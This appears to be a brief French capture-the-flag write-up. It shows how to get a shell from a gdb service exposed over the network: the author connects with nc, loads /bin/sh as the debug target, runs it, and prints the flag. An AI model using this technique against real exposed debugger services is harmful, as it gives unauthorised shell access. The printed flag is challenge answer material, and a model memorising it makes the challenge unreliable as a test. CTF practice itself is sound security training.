# Méthode 1

Débugger le binaire dans la session gdb accessible en ssh

# Méthode 2

Pop un shell ...

```
└─$ nc 10.0.0.4 6060
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /home/user/reverse...
(No debugging symbols found in /home/user/reverse)
(gdb) file sh
Reading symbols from sh...
(No debugging symbols found in sh)
(gdb) r
Starting program: /usr/bin/sh
cat flag.txt
ZiTF{5ksg6r36zko3v2i464k34i5jgv28j51j}
```
